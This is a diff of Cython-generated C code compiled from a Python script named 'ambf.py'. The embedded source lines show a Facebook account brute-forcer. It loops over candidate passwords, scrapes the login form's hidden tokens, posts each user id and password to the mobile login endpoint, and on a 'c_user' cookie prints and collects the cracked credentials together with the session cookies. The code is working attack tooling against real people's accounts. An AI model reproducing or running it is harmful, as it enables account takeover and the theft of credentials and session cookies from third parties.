+        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
+        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
+
+        /* "ambf.py":493
+ * 				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
+ * 				else:continue
+ * 			except:pass             # <<<<<<<<<<<<<<
+ * 		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+ * 		gaaa = ses.post(host+"/login/?next&ref=dbl&fl&refid=8",data=kwargs)
+ */
+        /*except:*/ {
+          __Pyx_ErrRestore(0,0,0);
+          goto __pyx_L16_exception_handled;
+        }
+        __pyx_L21_try_continue:;
+
+        /* "ambf.py":490
+ * 		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
+ * 		for i in b("input"):
+ * 			try:             # <<<<<<<<<<<<<<
+ * 				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
+ * 				else:continue
+ */
+        __Pyx_XGIVEREF(__pyx_t_3);
+        __Pyx_XGIVEREF(__pyx_t_2);
+        __Pyx_XGIVEREF(__pyx_t_1);
+        __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
+        goto __pyx_L13_continue;
+        __pyx_L16_exception_handled:;
+        __Pyx_XGIVEREF(__pyx_t_3);
+        __Pyx_XGIVEREF(__pyx_t_2);
+        __Pyx_XGIVEREF(__pyx_t_1);
+        __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
+        __pyx_L22_try_end:;
+      }
+
+      /* "ambf.py":489
+ * 		b = parser(p,"html.parser")
+ * 		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
+ * 		for i in b("input"):             # <<<<<<<<<<<<<<
+ * 			try:
+ * 				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
+ */
+      __pyx_L13_continue:;
+    }
+    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
+
+    /* "ambf.py":494
+ * 				else:continue
+ * 			except:pass
+ * 		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})             # <<<<<<<<<<<<<<
+ * 		gaaa = ses.post(host+"/login/?next&ref=dbl&fl&refid=8",data=kwargs)
+ * 		if "c_user" in ses.cookies.get_dict().keys():
+ */
+    __pyx_t_6 = __Pyx_PyDict_NewPresized(11); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 494, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_6);
+    if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_email, __pyx_v_uid) < 0) __PYX_ERR(0, 494, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_pass, __pyx_v_pw) < 0) __PYX_ERR(0, 494, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_prefill_contact_point, __pyx_kp_s__7) < 0) __PYX_ERR(0, 494, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_prefill_source, __pyx_kp_s__7) < 0) __PYX_ERR(0, 494, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_prefill_type, __pyx_kp_s__7) < 0) __PYX_ERR(0, 494, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_first_prefill_source, __pyx_kp_s__7) < 0) __PYX_ERR(0, 494, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_first_prefill_type, __pyx_kp_s__7) < 0) __PYX_ERR(0, 494, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_had_cp_prefilled, __pyx_n_s_false) < 0) __PYX_ERR(0, 494, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_had_password_prefilled, __pyx_n_s_false) < 0) __PYX_ERR(0, 494, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_is_smart_lock, __pyx_n_s_false) < 0) __PYX_ERR(0, 494, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_fb_noscript, __pyx_n_s_true) < 0) __PYX_ERR(0, 494, __pyx_L1_error)
+    __pyx_t_12 = __Pyx_CallUnboundCMethod1(&__pyx_umethod_PyDict_Type_update, __pyx_v_kwargs, __pyx_t_6); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 494, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_12);
+    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
+    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+
+    /* "ambf.py":495
+ * 			except:pass
+ * 		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+ * 		gaaa = ses.post(host+"/login/?next&ref=dbl&fl&refid=8",data=kwargs)             # <<<<<<<<<<<<<<
+ * 		if "c_user" in ses.cookies.get_dict().keys():
+ * 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
+ */
+    __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_post); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 495, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_12);
+    __pyx_t_6 = PyNumber_Add(__pyx_v_host, __pyx_kp_s_login_next_ref_dbl_fl_refid_8); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 495, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_6);
+    __pyx_t_11 = PyTuple_New(1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 495, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_11);
+    __Pyx_GIVEREF(__pyx_t_6);
+    PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_6);
+    __pyx_t_6 = 0;
+    __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 495, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_6);
+    if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_data, __pyx_v_kwargs) < 0) __PYX_ERR(0, 495, __pyx_L1_error)
+    __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_t_11, __pyx_t_6); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 495, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_8);
+    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
+    __Pyx_XDECREF_SET(__pyx_v_gaaa, __pyx_t_8);
+    __pyx_t_8 = 0;
+
+    /* "ambf.py":496
+ * 		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+ * 		gaaa = ses.post(host+"/login/?next&ref=dbl&fl&refid=8",data=kwargs)
+ * 		if "c_user" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
+ * 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
+ * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+ */
+    __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 496, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_11);
+    __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 496, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_12);
+    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+    __pyx_t_11 = NULL;
+    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
+      __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_12);
+      if (likely(__pyx_t_11)) {
+        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
+        __Pyx_INCREF(__pyx_t_11);
+        __Pyx_INCREF(function);
+        __Pyx_DECREF_SET(__pyx_t_12, function);
+      }
+    }
+    __pyx_t_6 = (__pyx_t_11) ? __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_11) : __Pyx_PyObject_CallNoArg(__pyx_t_12);
+    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
+    if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 496, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_6);
+    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+    __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_keys); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 496, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_12);
+    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
+    __pyx_t_6 = NULL;
+    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
+      __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_12);
+      if (likely(__pyx_t_6)) {
+        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
+        __Pyx_INCREF(__pyx_t_6);
+        __Pyx_INCREF(function);
+        __Pyx_DECREF_SET(__pyx_t_12, function);
+      }
+    }
+    __pyx_t_8 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_12);
+    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
+    if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 496, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_8);
+    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+    __pyx_t_18 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_c_user, __pyx_t_8, Py_EQ)); if (unlikely(__pyx_t_18 < 0)) __PYX_ERR(0, 496, __pyx_L1_error)
+    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+    __pyx_t_17 = (__pyx_t_18 != 0);
+    if (__pyx_t_17) {
+
+      /* "ambf.py":497
+ * 		gaaa = ses.post(host+"/login/?next&ref=dbl&fl&refid=8",data=kwargs)
+ * 		if "c_user" in ses.cookies.get_dict().keys():
+ * 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")             # <<<<<<<<<<<<<<
+ * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+ * 			ok.append("%s|%s"%(uid, pw))
+ */
+      __pyx_t_8 = PyList_New(0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 497, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_8);
+      __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 497, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_11);
+      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 497, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_10);
+      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+      __pyx_t_11 = NULL;
+      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
+        __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_10);
+        if (likely(__pyx_t_11)) {
+          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
+          __Pyx_INCREF(__pyx_t_11);
+          __Pyx_INCREF(function);
+          __Pyx_DECREF_SET(__pyx_t_10, function);
+        }
+      }
+      __pyx_t_6 = (__pyx_t_11) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_11) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
+      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
+      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 497, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_6);
+      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_items); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 497, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_10);
+      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
+      __pyx_t_6 = NULL;
+      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
+        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_10);
+        if (likely(__pyx_t_6)) {
+          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
+          __Pyx_INCREF(__pyx_t_6);
+          __Pyx_INCREF(function);
+          __Pyx_DECREF_SET(__pyx_t_10, function);
+        }
+      }
+      __pyx_t_12 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
+      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
+      if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 497, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_12);
+      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+      if (likely(PyList_CheckExact(__pyx_t_12)) || PyTuple_CheckExact(__pyx_t_12)) {
+        __pyx_t_10 = __pyx_t_12; __Pyx_INCREF(__pyx_t_10); __pyx_t_15 = 0;
+        __pyx_t_16 = NULL;
+      } else {
+        __pyx_t_15 = -1; __pyx_t_10 = PyObject_GetIter(__pyx_t_12); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 497, __pyx_L1_error)
+        __Pyx_GOTREF(__pyx_t_10);
+        __pyx_t_16 = Py_TYPE(__pyx_t_10)->tp_iternext; if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 497, __pyx_L1_error)
+      }
+      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
       for (;;) {
-        if (likely(!__pyx_t_13)) {
-          if (likely(PyList_CheckExact(__pyx_t_5))) {
-            if (__pyx_t_9 >= PyList_GET_SIZE(__pyx_t_5)) break;
+        if (likely(!__pyx_t_16)) {
+          if (likely(PyList_CheckExact(__pyx_t_10))) {
+            if (__pyx_t_15 >= PyList_GET_SIZE(__pyx_t_10)) break;
             #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
-            __pyx_t_6 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_9); __Pyx_INCREF(__pyx_t_6); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 482, __pyx_L11_error)
+            __pyx_t_12 = PyList_GET_ITEM(__pyx_t_10, __pyx_t_15); __Pyx_INCREF(__pyx_t_12); __pyx_t_15++; if (unlikely(0 < 0)) __PYX_ERR(0, 497, __pyx_L1_error)
             #else
-            __pyx_t_6 = PySequence_ITEM(__pyx_t_5, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 482, __pyx_L11_error)
-            __Pyx_GOTREF(__pyx_t_6);
+            __pyx_t_12 = PySequence_ITEM(__pyx_t_10, __pyx_t_15); __pyx_t_15++; if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 497, __pyx_L1_error)
+            __Pyx_GOTREF(__pyx_t_12);
             #endif
           } else {
-            if (__pyx_t_9 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
+            if (__pyx_t_15 >= PyTuple_GET_SIZE(__pyx_t_10)) break;
             #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
-            __pyx_t_6 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_9); __Pyx_INCREF(__pyx_t_6); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 482, __pyx_L11_error)
+            __pyx_t_12 = PyTuple_GET_ITEM(__pyx_t_10, __pyx_t_15); __Pyx_INCREF(__pyx_t_12); __pyx_t_15++; if (unlikely(0 < 0)) __PYX_ERR(0, 497, __pyx_L1_error)
             #else
-            __pyx_t_6 = PySequence_ITEM(__pyx_t_5, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 482, __pyx_L11_error)
-            __Pyx_GOTREF(__pyx_t_6);
+            __pyx_t_12 = PySequence_ITEM(__pyx_t_10, __pyx_t_15); __pyx_t_15++; if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 497, __pyx_L1_error)
+            __Pyx_GOTREF(__pyx_t_12);
             #endif
           }
         } else {
-          __pyx_t_6 = __pyx_t_13(__pyx_t_5);
-          if (unlikely(!__pyx_t_6)) {
+          __pyx_t_12 = __pyx_t_16(__pyx_t_10);
+          if (unlikely(!__pyx_t_12)) {
             PyObject* exc_type = PyErr_Occurred();
             if (exc_type) {
               if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
-              else __PYX_ERR(0, 482, __pyx_L11_error)
+              else __PYX_ERR(0, 497, __pyx_L1_error)
             }
             break;
           }
-          __Pyx_GOTREF(__pyx_t_6);
-        }
-        __Pyx_XDECREF_SET(__pyx_v_pw, __pyx_t_6);
-        __pyx_t_6 = 0;
-
-        /* "ambf.py":483
- * 	try:
- * 		for pw in pwx:
- * 			kwargs = {}             # <<<<<<<<<<<<<<
- * 			pw = pw.lower()
- * 			ses = requests.Session()
- */
-        __pyx_t_6 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 483, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_6);
-        __Pyx_DECREF_SET(__pyx_v_kwargs, ((PyObject*)__pyx_t_6));
-        __pyx_t_6 = 0;
-
-        /* "ambf.py":484
- * 		for pw in pwx:
- * 			kwargs = {}
- * 			pw = pw.lower()             # <<<<<<<<<<<<<<
- * 			ses = requests.Session()
- * 			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
- */
-        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_v_pw, __pyx_n_s_lower); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 484, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_11);
-        __pyx_t_12 = NULL;
-        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
-          __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_11);
-          if (likely(__pyx_t_12)) {
-            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
-            __Pyx_INCREF(__pyx_t_12);
-            __Pyx_INCREF(function);
-            __Pyx_DECREF_SET(__pyx_t_11, function);
-          }
-        }
-        __pyx_t_6 = (__pyx_t_12) ? __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_12) : __Pyx_PyObject_CallNoArg(__pyx_t_11);
-        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
-        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 484, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_6);
-        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-        __Pyx_DECREF_SET(__pyx_v_pw, __pyx_t_6);
-        __pyx_t_6 = 0;
-
-        /* "ambf.py":485
- * 			kwargs = {}
- * 			pw = pw.lower()
- * 			ses = requests.Session()             # <<<<<<<<<<<<<<
- * 			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
- * 			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
- */
-        __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_requests); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 485, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_11);
-        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_Session); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 485, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_12);
-        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-        __pyx_t_11 = NULL;
-        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_12))) {
-          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_12);
-          if (likely(__pyx_t_11)) {
-            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
-            __Pyx_INCREF(__pyx_t_11);
-            __Pyx_INCREF(function);
-            __Pyx_DECREF_SET(__pyx_t_12, function);
-          }
-        }
-        __pyx_t_6 = (__pyx_t_11) ? __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_11) : __Pyx_PyObject_CallNoArg(__pyx_t_12);
-        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
-        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 485, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_6);
-        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-        __Pyx_XDECREF_SET(__pyx_v_ses, __pyx_t_6);
-        __pyx_t_6 = 0;
-
-        /* "ambf.py":486
- * 			pw = pw.lower()
- * 			ses = requests.Session()
- * 			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})             # <<<<<<<<<<<<<<
- * 			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
- * 			b = parser(p,"html.parser")
- */
-        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_headers); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 486, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_12);
-        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_update); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 486, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_11);
-        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-        __pyx_t_12 = __Pyx_PyDict_NewPresized(10); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 486, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_12);
-        if (PyDict_SetItem(__pyx_t_12, __pyx_n_s_origin, __pyx_v_host) < 0) __PYX_ERR(0, 486, __pyx_L11_error)
-        if (PyDict_SetItem(__pyx_t_12, __pyx_kp_s_accept_language, __pyx_kp_s_id_ID_id_q_0_9_en_US_q_0_8_en_q) < 0) __PYX_ERR(0, 486, __pyx_L11_error)
-        if (PyDict_SetItem(__pyx_t_12, __pyx_kp_s_accept_encoding, __pyx_kp_s_gzip_deflate) < 0) __PYX_ERR(0, 486, __pyx_L11_error)
-        if (PyDict_SetItem(__pyx_t_12, __pyx_n_s_accept, __pyx_kp_s_text_html_application_xhtml_xml) < 0) __PYX_ERR(0, 486, __pyx_L11_error)
-        if (PyDict_SetItem(__pyx_t_12, __pyx_kp_s_user_agent, __pyx_v_ua) < 0) __PYX_ERR(0, 486, __pyx_L11_error)
-        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_bs4); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 486, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_8);
-        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_re); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 486, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_4);
-        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_findall); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 486, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_8);
-        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
-        __pyx_t_4 = NULL;
-        __pyx_t_7 = 0;
-        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
-          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_8);
-          if (likely(__pyx_t_4)) {
-            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
-            __Pyx_INCREF(__pyx_t_4);
-            __Pyx_INCREF(function);
-            __Pyx_DECREF_SET(__pyx_t_8, function);
-            __pyx_t_7 = 1;
-          }
-        }
-        #if CYTHON_FAST_PYCALL
-        if (PyFunction_Check(__pyx_t_8)) {
-          PyObject *__pyx_temp[3] = {__pyx_t_4, __pyx_kp_s__46, __pyx_v_host};
-          __pyx_t_10 = __Pyx_PyFunction_FastCall(__pyx_t_8, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 486, __pyx_L11_error)
-          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-          __Pyx_GOTREF(__pyx_t_10);
-        } else
-        #endif
-        #if CYTHON_FAST_PYCCALL
-        if (__Pyx_PyFastCFunction_Check(__pyx_t_8)) {
-          PyObject *__pyx_temp[3] = {__pyx_t_4, __pyx_kp_s__46, __pyx_v_host};
-          __pyx_t_10 = __Pyx_PyCFunction_FastCall(__pyx_t_8, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 486, __pyx_L11_error)
-          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-          __Pyx_GOTREF(__pyx_t_10);
-        } else
-        #endif
-        {
-          __pyx_t_14 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 486, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_14);
-          if (__pyx_t_4) {
-            __Pyx_GIVEREF(__pyx_t_4); PyTuple_SET_ITEM(__pyx_t_14, 0, __pyx_t_4); __pyx_t_4 = NULL;
-          }
-          __Pyx_INCREF(__pyx_kp_s__46);
-          __Pyx_GIVEREF(__pyx_kp_s__46);
-          PyTuple_SET_ITEM(__pyx_t_14, 0+__pyx_t_7, __pyx_kp_s__46);
-          __Pyx_INCREF(__pyx_v_host);
-          __Pyx_GIVEREF(__pyx_v_host);
-          PyTuple_SET_ITEM(__pyx_t_14, 1+__pyx_t_7, __pyx_v_host);
-          __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_t_14, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 486, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_10);
-          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
-        }
-        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-        __pyx_t_8 = __Pyx_PyString_Join(__pyx_kp_s__7, __pyx_t_10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 486, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_8);
-        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-        if (PyDict_SetItem(__pyx_t_12, __pyx_n_s_Host, __pyx_t_8) < 0) __PYX_ERR(0, 486, __pyx_L11_error)
-        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
